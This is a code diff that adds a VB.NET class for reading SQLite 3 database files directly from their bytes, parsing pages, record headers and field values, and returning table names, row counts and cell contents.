+
+            'Length for setting the array length for the entries
+            Dim Length As System.UInt16 = ConvertToInteger(Offset + 3, 2) - 1
+            Dim ol As Integer = 0
+
+            If Not table_entries Is Nothing Then
+                ol = table_entries.Length
+                ReDim Preserve table_entries(table_entries.Length + Length)
+            Else
+                ReDim table_entries(Length)
+            End If
+
+            Dim ent_offset As System.UInt64
+            Dim i As Integer
+
+            For i = 0 To Length Step 1
+                ent_offset = ConvertToInteger(Offset + 8 + (i * 2), 2)
+
+                If Offset <> 100 Then ent_offset = ent_offset + Offset
+
+                'Table Cell auslesen
+                Dim t As Integer = GVL(ent_offset)
+                Dim size As System.Int64 = CVL(ent_offset, t)
+
+                Dim s As Integer = GVL(ent_offset + (t - ent_offset) + 1)
+                table_entries(ol + i).row_id = CVL(ent_offset + (t - ent_offset) + 1, s)
+
+                'Table Content
+                'Resetting the offset
+                ent_offset = ent_offset + (s - ent_offset) + 1
+
+                'Now get to the Record Header
+                t = GVL(ent_offset)
+                s = t
+                Dim Rec_Header_Size As System.Int64 = CVL(ent_offset, t) 'Record Header Length
+
+                Dim Field_Size() As record_header_field
+                Dim size_read As System.Int64 = (ent_offset - t) + 1
+                Dim j As Integer = 0
+
+                'Now get the field sizes and fill in the Values
+                ReDim Preserve Field_Size(0)
+                While size_read < Rec_Header_Size
+                    ReDim Preserve Field_Size(j)
+
+                    t = s + 1
+                    s = GVL(t)
+                    Field_Size(j).type = CVL(t, s)
+
+                    If Field_Size(j).type > 9 Then
+                        If IsOdd(Field_Size(j).type) Then
+                            Field_Size(j).size = (Field_Size(j).type - 13) / 2
+                        Else
+                            Field_Size(j).size = (Field_Size(j).type - 12) / 2
+                        End If
+                    Else
+                        Field_Size(j).size = SQLDataTypeSize(Field_Size(j).type)
+                    End If
+
+                    size_read = size_read + (s - t) + 1
+                    j = j + 1
+                End While
+
+                ReDim table_entries(ol + i).content(Field_Size.Length - 1)
+                Dim counter As Integer = 0
+                Dim k As Integer
+
+                For k = 0 To Field_Size.Length - 1 Step 1
+                    If Field_Size(k).type > 9 Then
+                        If Not IsOdd(Field_Size(k).type) Then
+                            If encoding = 1 Then
+                                table_entries(ol + i).content(k) = System.Text.Encoding.Default.GetString(db_bytes, ent_offset + Rec_Header_Size + counter, Field_Size(k).size)
+                            ElseIf encoding = 2 Then
+                                table_entries(ol + i).content(k) = System.Text.Encoding.Unicode.GetString(db_bytes, ent_offset + Rec_Header_Size + counter, Field_Size(k).size)
+                            ElseIf encoding = 3 Then
+                                table_entries(ol + i).content(k) = System.Text.Encoding.BigEndianUnicode.GetString(db_bytes, ent_offset + Rec_Header_Size + counter, Field_Size(k).size)
+                            End If
+                        Else
+                            table_entries(ol + i).content(k) = System.Text.Encoding.Default.GetString(db_bytes, ent_offset + Rec_Header_Size + counter, Field_Size(k).size)
+                        End If
+                    Else
+                        table_entries(ol + i).content(k) = CStr(ConvertToInteger(ent_offset + Rec_Header_Size + counter, Field_Size(k).size))
+                    End If
+
+                    counter = counter + Field_Size(k).size
+                Next
+            Next
+        ElseIf db_bytes(Offset) = &H5 Then 'internal node
+            Dim Length As System.UInt16 = ConvertToInteger(Offset + 3, 2) - 1
+            Dim ent_offset As System.UInt16
+            Dim i As Integer
+
+            For i = 0 To Length Step 1
+                ent_offset = ConvertToInteger(Offset + 12 + (i * 2), 2)
+
+                ReadTableFromOffset((ConvertToInteger(Offset + ent_offset, 4) - 1) * page_size)
+            Next
+
+            ReadTableFromOffset((ConvertToInteger(Offset + 8, 4) - 1) * page_size)
+        End If
+
+        Return True
+    End Function
+
+    ' Reads a complete table with all entries in it
+    Public Function ReadTable(ByVal TableName As String) As Boolean
+        ' First loop through sqlite_master and look if table exists
+        Dim found As Integer = -1
+        Dim i As Integer
+
+        For i = 0 To master_table_entries.Length Step 1
+            If master_table_entries(i).item_name.ToLower().CompareTo(TableName.ToLower()) = 0 Then
+                found = i
+                Exit For
+            End If
+        Next
+
+        If found = -1 Then Return False
+
+        Dim fields() As Object = master_table_entries(found).sql_statement.Substring(master_table_entries(found).sql_statement.IndexOf("(") + 1).Split(",")
+
+        For i = 0 To fields.Length - 1 Step 1
+            fields(i) = TrimL(fields(i))
+            Dim index As Object = fields(i).IndexOf(" ")
+
+            If index > 0 Then fields(i) = fields(i).Substring(0, index)
+
+            If fields(i).IndexOf("UNIQUE") = 0 Then
+                Exit For
+            Else
+                ReDim Preserve field_names(i)
+                field_names(i) = fields(i)
+            End If
+        Next
+
+        Return ReadTableFromOffset((master_table_entries(found).root_num - 1) * page_size)
+    End Function
+    Public Function TrimL(ByVal str As String) As String
+        Dim i As Integer
+        TrimL = ""
+        If str(0) = " " Then
+            For i = 1 To str.Length - 1
+                TrimL += str(i)
+            Next
+            TrimL(TrimL)
+        Else
+            Return str
+        End If
+    End Function
+    ' Returns the row count of current table
+    Public Function GetRowCount() As Integer
+        Return table_entries.Length
+    End Function
+
+    ' Returns a Value from current table in row row_num with field number field
+    Public Function GetValue(ByVal row_num As Integer, ByVal field As Integer) As String
+        If row_num >= table_entries.Length Then Return Nothing
+        If field >= table_entries(row_num).content.Length Then Return Nothing
+
+        Return table_entries(row_num).content(field)
+    End Function
+
+    ' Returns a Value from current table in row row_num with field name field
+    Public Function GetValue(ByVal row_num As Integer, ByVal field As String) As String
+        Dim found As Integer = -1
+        Dim i As Integer
+        For i = 0 To field_names.Length Step 1
+            If field_names(i).ToLower().CompareTo(field.ToLower()) = 0 Then
+                found = i
+                Exit For
+            End If
+        Next
+
+        If found = -1 Then Return Nothing
+
+        Return GetValue(row_num, found)
+    End Function
+
+    ' Returns a String-Array with all Tablenames
+    Public Function GetTableNames() As String()
+        Dim retVal As String() = {""}
+        Dim arr As Integer = 0
+        Dim i As Integer
+        For i = 0 To master_table_entries.Length - 1 Step 1
+            If master_table_entries(i).item_type = "table" Then
+                ReDim Preserve retVal(arr)
+                retVal(arr) = master_table_entries(i).item_name
+                arr = arr + 1
+            End If
+        Next
+
+        Return retVal
+    End Function
+
+    ' Constructor
+    Public Sub New(ByVal baseName As String)
+        'Page Number n is page_size*(n-1)
+        If File.Exists(baseName) Then
+            Microsoft.VisualBasic.FileSystem.FileOpen(1, baseName, Microsoft.VisualBasic.OpenMode.Binary, Microsoft.VisualBasic.OpenAccess.Read, Microsoft.VisualBasic.OpenShare.Shared)
+            Dim asi As String = Microsoft.VisualBasic.Space(Microsoft.VisualBasic.LOF(1))
+            Microsoft.VisualBasic.FileSystem.FileGet(1, asi)
+            Microsoft.VisualBasic.FileSystem.FileClose(1)
+
+            db_bytes = System.Text.Encoding.Default.GetBytes(asi)
+
+            If System.Text.Encoding.Default.GetString(db_bytes, 0, 15).CompareTo("SQLite format 3") <> 0 Then
+                Throw New System.Exception("Not a valid SQLite 3 Database File")
+                Exit Sub
+            End If
+
+            If db_bytes(52) <> 0 Then
+                Throw New System.Exception("Auto-vacuum capable database is not supported")
+                Exit Sub
+            ElseIf ConvertToInteger(44, 4) >= 4 Then
+                Throw New System.Exception("No supported Schema layer file-format")
+                Exit Sub
+            End If
+
+            page_size = ConvertToInteger(16, 2)
+            encoding = ConvertToInteger(56, 4)
+
+            If encoding = 0 Then encoding = 1
+
+            'Now we read the sqlite_master table
+            'Offset is 100 in first page
+            ReadMasterTable(100)
+        End If
+    End Sub
+End Class
+
